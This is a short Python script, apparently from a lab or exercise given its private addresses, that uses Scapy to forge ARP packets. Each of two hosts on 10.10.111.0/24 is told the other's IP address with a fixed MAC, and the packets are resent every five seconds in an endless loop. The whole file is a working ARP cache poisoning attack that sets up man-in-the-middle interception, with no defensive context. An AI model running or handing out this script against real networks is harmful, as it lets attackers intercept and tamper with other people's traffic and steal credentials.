from scapy.all import *
import time

arp1= ARP (op=1,psrc='10.10.111.1',pdst='10.10.111.110',hwdst='02:00:83:46:01:01')
arp2= ARP (op=1,psrc='10.10.111.110',pdst='10.10.111.1',hwdst='02:00:83:46:01:01')

while 1:
	send(arp1)
	send(arp2)
	time.sleep(5)